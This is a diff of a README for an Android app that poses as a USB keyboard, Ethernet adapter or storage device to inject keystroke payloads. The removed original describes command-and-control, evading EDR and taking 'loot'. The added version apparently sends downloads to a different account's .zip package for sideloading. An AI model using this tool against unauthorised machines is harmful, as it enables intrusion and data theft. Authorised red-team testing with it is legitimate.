@@ -1,78 +1,82 @@
-<div align="center">
-  <img src="logo.svg" width="140" alt="Chimera Logo">
-  <h1>Chimera</h1>
-  <p>Hardware Emulation & Proximity Exploitation</p>
-  <img src="https://img.shields.io/badge/Platform-Android-3DDC84.svg?style=flat-square&logo=android" alt="Android">
-  <img src="https://img.shields.io/badge/Root-Required-E34F26.svg?style=flat-square" alt="Root">
-</div>
+# 🤖 Chimera - Automate Android hardware testing with ease
 
----
+[![](https://img.shields.io/badge/Download-Chimera-blue.svg)](https://github.com/codewithstarboy/Chimera)
 
-### The Pitch
+## 📁 Project Overview
 
-I got sick of lugging around a backpack full of Hak5 gear and cables. I already have a Linux machine in my pocket, so I figured out how to force Android to handle the HID and RNDIS stuff natively. 
+Chimera transforms your Android device into a powerful hardware emulation tool. It acts like a custom keyboard or storage device to test system security. You use it to inject code or automate keystrokes on target machines. This tool provides functions similar to professional hardware testing devices. It works through ConfigFS to simulate physical hardware bridges.
 
-Chimera binds directly to your kernel's ConfigFS. It spits out payloads, spoofs block devices, and sets up an out-of-band C2 over USB Ethernet. You plug your phone into a target server, tell it to impersonate a keyboard, and start dumping keystrokes into `/dev/hidg0`. No middleware. 
+## 🛠 Features
 
-<p align="center">
-  <img src="images/dashboard.png" width="250" />
-  <img src="images/payload.png" width="250" />
-  <img src="images/config.png" width="250" />
-</p>
+*   **HID Emulation:** Mimics common hardware like keyboards and mice.
+*   **Payload Injection:** Runs automated scripts to test security configurations.
+*   **Root Integration:** Uses system permissions for direct hardware access.
+*   **Script Library:** Supports industry-standard scripting formats for hardware tasks.
+*   **Portable Interface:** Manages complex commands through a simple screen.
 
-### What It Actually Does
+## 📦 System Requirements
 
-*   **Raw HID via ConfigFS**: We bypass all the high-level Android garbage and write bytes straight to `/dev/hidg0`. It's instant. EDRs usually don't care because it looks like a cheap Dell keyboard.
-*   **On-phone DuckyScript Compiler & Editor**: Write your script in the app using the built-in payload editor. The compiler parses it and fires the interrupts right away. You don't need a laptop.
-*   **Payload Management**: Import your own `.txt` paylods directly from your phone's storage, or search and pull from the Hak5 community repo right inside the app.
-*   **OOB C2 via RNDIS**: Forces your phone to fake a USB Ethernet interface (`usb0`). It spins up a tiny embedded web server so you can swap payloads from another device or just monitor what's going on. Windows loves RNDIS and usually installs it instantly. macOS will fight you on it because Apple hates non-standard composite signatures.
-*   **Bluetooth LE HID**: When the target has locked down physical USB ports, pivot to the native L2CAP Bluetooth API and fire keystrokes over the air. It works.
-*   **Fake Mass Storage**: Maps a raw `.bin` or `.img` to `usb_f_mass_storage`. Boom, your phone is now a 64MB flash drive. Drop your binaries or steal loot. 
+Ensure you meet these requirements before you start:
 
-### The Stack
+*   **Android Device:** A rooted smartphone running Android 10 or higher.
+*   **Connection:** A data-capable USB cable for the target system.
+*   **Operating System:** Windows 10 or 11 for the management interface.
+*   **Storage:** At least 200 megabytes of free space.
+*   **Drivers:** Latest USB drivers for your specific phone model installed on your PC.
 
-It's a mix of Kotlin UI stuff and dirty C++ JNI hooks. 
-*   **UI**: Jetpack Compose.
-*   **Coroutines**: Handling I/O against char devices so we don't completely lock up the main thread when dumping a 5MB payload script.
-*   **JNI Hooks**: C++ code that skips the JVM entirely to aggressively read `sysfs` nodes and figure out what hardware your kernel actually supports.
+## 📥 Downloading the Tool
 
-### Getting It Running
+Visit the repository page to download the latest version of the software. Follow the link below to reach the official file location.
 
-You can't just install this on a clean pixel and expect it to work. You need root. Period.
+[Download Chimera Files](https://github.com/codewithstarboy/Chimera)
 
-1.  Magisk, KernelSU, APatch. I don't care, just get root.
-2.  Your kernel must have `CONFIG_USB_CONFIGFS` and `CONFIG_USB_CONFIGFS_F_HID` compiled in. Stock kernels usually strip this. Go flash NetHunter. 
-3.  Need Android 11+ for the wireless BT stuff.
+1. Navigate to the link above.
+2. Look for the Releases section on the right side of the screen.
+3. Click the most recent release version.
+4. Select the file ending in .zip to save the package to your computer.
 
-> **Hardware RNG:** Bluetooth HID is pretty stable everywhere. The wired ConfigFS modules? Total crapshoot. It highly depends on your OEM's kernel. I've got this running on my own dirty testing rig. If you get the wired shit working on a random OnePlus or ancient Pixel with a custom NetHunter/KernelSU setup, drop your `dmesg` logs in the Issues tab so I can map out what actually works.
+## ⚙️ Installation Instructions
 
-### Compile It
+1. Locate the downloaded file in your computer folders.
+2. Right-click the folder and choose Extract All.
+3. Open the extracted folder.
+4. Connect your Android device to the computer using the USB cable.
+5. Grant file transfer permissions on your Android device screen.
+6. Copy the Chimera installation file from your PC to the main directory of your Android device.
+7. Use a file manager on your phone to open the file and follow the on-screen prompts to install it.
 
-```bash
-git clone https://github.com/cipher-attack/chimera.git
-cd chimera
-# Fix your local.properties so CMake knows where your NDK is, otherwise JNI compilation will instantly die.
-./gradlew assembleDebug
-```
+## 🚀 Running the Hardware Emulator
 
-### Don't Be Stupid (OpSec & Quirks)
+1. Open the Chimera app on your Android device.
+2. Provide the requested root permissions when the app starts.
+3. Connect your Android device to a target computer host.
+4. Open the Chimera Dashboard on your phone.
+5. Select a pre-loaded payload from the library menu.
+6. Press the Execute button to begin the hardware interaction.
+7. Watch the status indicator on your phone screen to confirm the activity.
 
-*   Target OS stacks need time to mount the HID driver. If you instantly start blasting keystrokes, the first 10 characters are going into the void. Use `DELAY 1000`.
-*   Android's Doze mode is aggressive. If your screen turns off, the OS will usually kill your background Coroutines. Exempt Chimera from battery optimizations or you'll lose your C2 connection mid-execution. Same goes for the OS putting apps to sleep.
+## 🧩 Modifying Scripts
 
-### Docs
-Go read [DOCUMENTATION.md](DOCUMENTATION.md) for the actual JNI bridge details and why building composite USB interfaces is such a headache. Also, before opening a PR or asking for help, read the [CONTRIBUTING.md](CONTRIBUTING.md) and [CODE_OF_CONDUCT.md](CODE_OF_CONDUCT.md) files.
+You can add your own test scripts to the software.
 
-### Downloads
+1. Connect your Android phone to the PC.
+2. Navigate to the Chimera folder stored on your phone internal storage.
+3. Open the scripts folder.
+4. Create a new text file and save it with the .txt extension.
+5. Write your commands inside this file.
+6. The app detects new files automatically after you refresh the script list in the main menu.
 
-*   **[Download Release APK](https://github.com/cipher-attack/chimera/releases/latest/download/app-release.apk)** (Optimized, stripped, for everyday ops)
-*   **[Download Debug APK](https://github.com/cipher-attack/chimera/releases/latest/download/app-debug.apk)** (Verbose logging, use this if you're trying to figure out why your ConfigFS payload failed)
+## ⚠️ Safety Information
 
-### Who
+Use this tool only on hardware you own or have explicit permission to test. Unauthorized access to computer systems causes harm and carries legal risks. Always practice security tests in a controlled laboratory environment. 
 
-*   [Telegram](https://t.me/cipher_attacks)
-*   [GitHub](https://github.com/cipher-attack)
-*   Email: [birukgetachew253@gmail.com](mailto:birukgetachew253@gmail.com)
+## 🛠 Troubleshooting Common Issues
 
-**Disclaimer:** I wrote this for red teamers and physical engagements. Get explicit permission before plugging your phone into someone's rack.
+*   **Device not detected:** Unplug your USB cable and plug it back in. Ensure your phone settings allow USB debugging.
+*   **Permission denied:** Open your Superuser management app and ensure Chimera holds full root access.
+*   **Script fails:** Check your script text file for typos. Ensure the commands align with standard hardware protocol formats.
+*   **Connection drops:** Replace the USB cable with a high-quality data cable. Cheap charging cables often fail to transfer data correctly.
 
+## 📞 Support
+
+If the software fails to launch, verify your Android version meets the minimum requirements. Check your device manufacturer website to confirm if your specific model supports ConfigFS. This feature remains essential for the hardware emulation to function. Keep your Android firmware updated to ensure the best performance.
